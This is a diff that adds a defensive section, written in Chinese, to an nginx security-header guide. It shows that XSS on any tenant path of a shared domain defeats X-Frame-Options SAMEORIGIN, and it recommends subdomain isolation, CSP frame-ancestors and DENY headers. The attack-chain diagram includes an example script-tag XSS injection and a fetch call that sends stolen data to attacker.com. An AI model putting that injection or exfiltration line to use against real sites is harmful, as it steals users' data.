@@ -266,3 +266,176 @@ curl -I https://www.abc.com/api/v1/embeddable-customer
 | **记录和审计** | 追踪哪些 API 使用了 SAMEORIGIN |
 
 **最终建议**：如果 API 平台的大部分 API 不需要 iframe 嵌入功能，保持全局 `DENY` 是最安全的选择。仅为确有需要的少数 API 开启 `SAMEORIGIN`，并确保这些 API 返回的数据不包含高度敏感信息（如认证 token、个人隐私数据等）。
+
+---
+
+## 10. 多租户场景下的 SAMEORIGIN 安全评估（追加）
+
+### 10.1 场景描述
+
+你的架构是**同一域名下按 Location path 划分多个用户/租户**：
+
+```
+www.abc.com/tenant-a/api/...  → 用户 A 的 API
+www.abc.com/tenant-b/api/...  → 用户 B 的 API
+www.abc.com/tenant-c/api/...  → 用户 C 的 API
+```
+
+其中某些租户的 API 开启了 `SAMEORIGIN`（允许 iframe 嵌入），而其他租户可能是普通 API。
+
+### 10.2 核心问题
+
+**如果攻击者能在同域名任意路径注入 XSS，是否能攻击使用 SAMEORIGIN 的其他租户？**
+
+**答案：是，攻击完全成立。**
+
+### 10.3 攻击链分析
+
+```
+┌─────────────────────────────────────────────────────────────┐
+│ 攻击场景：Tenant-A 的 API 开启了 SAMEORIGIN                   │
+│           Tenant-B 被攻击者注入了 XSS                         │
+└─────────────────────────────────────────────────────────────┘
+
+攻击流程：
+
+1. 攻击者通过 XSS 在 Tenant-B 的路径注入恶意 JS
+   www.abc.com/tenant-b/user/profile?name=<script>恶意代码</script>
+
+2. 受害者访问 Tenant-B 的页面，恶意 JS 在浏览器执行
+   恶意 JS 与 www.abc.com 同源（因为是同一域名）
+
+3. 恶意 JS 创建隐藏 iframe 嵌入 Tenant-A 的 SAMEORIGIN API
+   <iframe src="www.abc.com/tenant-a/api/embeddable"></iframe>
+
+4. 由于 iframe 页面与恶意 JS 同源，恶意 JS 可以：
+   - 读取 iframe 的完整 DOM
+   - 访问 iframe 的 localStorage/sessionStorage
+   - 读取 iframe 内的 API 响应（包括敏感数据）
+
+5. 恶意 JS 将窃取的敏感数据外带
+   fetch('https://attacker.com/steal?data=' + stolenData)
+```
+
+### 10.4 同源策略的关键点
+
+同源策略的"同源"定义是：**协议 + 域名 + 端口**，**与路径无关**。
+
+```
+www.abc.com/tenant-a/api    → origin = https://www.abc.com
+www.abc.com/tenant-b/api    → origin = https://www.abc.com  （相同！）
+www.abc.com/any/path        → origin = https://www.abc.com  （相同！）
+```
+
+因此：
+- Tenant-B 的 XSS 与 Tenant-A 的 SAMEORIGIN API **是同源的**
+- SAMEORIGIN 的保护在 XSS 面前**完全失效**
+
+### 10.5 风险评估矩阵
+
+| 风险因素 | 严重程度 | 说明 |
+|---------|----------|------|
+| 任意租户存在 XSS | **致命** | 可攻击所有使用 SAMEORIGIN 的租户 |
+| 多租户共享域名 | **高** | 攻击面从单一路径扩大到所有租户路径 |
+| SAMEORIGIN API 返回敏感数据 | **高** | 即使 XSS 在其他租户，也可窃取数据 |
+| 攻击隐蔽性 | **高** | 恶意 JS 在受害者浏览器执行，难检测 |
+
+### 10.6 更危险的攻击场景
+
+如果攻击者控制了某个**使用 SAMEORIGIN 的租户**（例如 Tenant-A 本身被入侵）：
+
+```
+1. 攻击者直接在自己的租户页面植入恶意 JS
+2. 恶意 JS 可以嵌入其他所有使用 SAMEORIGIN 的租户 API
+3. 甚至可以嵌入设置了 DENY 的 API（因为 DENY 只阻止 iframe 嵌入，
+   但恶意 JS 已经在同源内，可以直接调用 API 获取数据）
+```
+
+**关键结论**：当多租户共享同一域名时，SAMEORIGIN 的安全性**不仅依赖你自己的路径无 XSS，而是依赖所有租户的所有路径都无 XSS**。
+
+### 10.7 多租户场景的安全建议
+
+#### 10.7.1 如果必须使用 SAMEORIGIN
+
+```nginx
+# 为每个租户使用独立的子域名（隔离 origin）
+tenant-a.api.abc.com
+tenant-b.api.abc.com
+
+# 这样 XSS 在 tenant-b.api.abc.com 无法嵌入 tenant-a.api.abc.com
+# 因为是不同 origin
+```
+
+#### 10.7.2 考虑使用 CSP frame-ancestors 限制
+
+```nginx
+# 不允许任何 iframe 嵌入
+add_header Content-Security-Policy "frame-ancestors 'none';" always;
+
+# 或仅允许特定受控域名
+add_header Content-Security-Policy "frame-ancestors https://trusted-portal.abc.com;" always;
+```
+
+#### 10.7.3 对敏感 API 使用 DENY
+
+```nginx
+# 即使是 embeddable API，如果返回敏感数据，仍使用 DENY
+location /api/v1/sensitive-data {
+    add_header X-Frame-Options DENY always;
+    # 重新包含所有安全头
+    add_header X-Content-Type-Options nosniff always;
+    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;
+}
+```
+
+#### 10.7.4 最小化 SAMEORIGIN API 的数量
+
+```nginx
+# 默认全局 DENY
+server {
+    include /etc/nginx/snippets/security-headers-deny.conf;
+}
+
+# 仅对极少数确需嵌入且数据不敏感的 API 使用 SAMEORIGIN
+location /public/embeddable/dashboard {
+    # 此 API 必须：
+    # 1. 不返回敏感数据（无 auth token、无 PII）
+    # 2. 所有租户路径都无 XSS 漏洞
+    # 3. 用户明确知情同意嵌入风险
+    include /etc/nginx/snippets/security-headers-sameorigin.conf;
+}
+```
+
+### 10.8 多租户隔离的最佳实践
+
+| 方案 | 隔离程度 | 成本 | 适用场景 |
+|------|---------|------|---------|
+| 独立子域名 | 完全隔离 | 中 | 多租户需要 SAMEORIGIN 时 |
+| 统一 DENY | 最安全 | 低 | 大多数多租户 API 场景 |
+| CSP frame-ancestors | 中等 | 中 | 需要细粒度控制嵌入来源 |
+| 每租户独立证书/域名 | 完全隔离 | 高 | 高安全要求场景 |
+
+### 10.9 审计清单（多租户场景）
+
+- [ ] **识别所有使用 SAMEORIGIN 的 API 路径**
+- [ ] **评估每个 SAMEORIGIN API 返回的数据敏感性**
+- [ ] **检查所有租户路径的 XSS 防护措施**
+- [ ] **考虑迁移到独立子域名隔离**
+- [ ] **如果不能隔离，至少确保所有租户路径都有严格的输入验证**
+- [ ] **定期进行全域名 XSS 扫描**
+- [ ] **考虑使用 WAF 防护 XSS 攻击**
+
+### 10.10 最终结论
+
+**在多租户按路径划分且共享同一域名的情况下，使用 SAMEORIGIN 是一个高风险选择。**
+
+核心原因：
+1. **攻击面扩展**：任意租户的 XSS 都能攻击所有 SAMEORIGIN API
+2. **木桶效应**：安全性取决于所有租户中最薄弱的那个
+3. **数据泄露风险**：SAMEORIGIN API 返回的数据可能在不知情情况下被窃取
+
+**推荐做法**：
+- 尽量使用 `DENY`，避免 SAMEORIGIN
+- 如需 SAMEORIGIN，优先考虑子域名隔离
+- 定期审计所有租户路径的 XSS 漏洞
+- 使用 CSP frame-ancestors 替代 X-Frame-Options 以获得更细粒度控制
